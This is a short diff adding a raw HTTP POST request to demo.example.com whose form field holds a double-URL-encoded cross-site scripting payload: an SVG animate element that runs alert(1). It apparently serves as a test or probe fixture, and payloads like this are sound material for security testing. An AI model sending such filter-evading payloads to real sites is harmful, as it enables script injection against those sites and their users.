@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 87
+Connection: close
+
+cmd=%253Csvg%253E%253Canimate%2Bonbegin%253Dalert%25281%2529%2BattributeName%253Dx%253E
